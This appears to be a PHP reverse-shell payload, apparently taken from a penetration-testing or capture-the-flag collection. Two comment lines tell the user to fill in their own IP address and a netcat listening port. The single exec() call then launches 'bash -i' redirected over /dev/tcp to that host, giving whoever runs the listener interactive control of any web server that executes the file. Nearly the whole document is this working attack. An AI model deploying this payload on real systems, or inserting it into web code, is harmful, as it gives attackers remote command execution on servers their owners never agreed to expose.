# IP.AD.DR.ESS = your machine's ip addr
# PORT = the port your machine will listen to (i.e. nc)

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/IP.AD.DR.ESS/PORT 0>&1'");
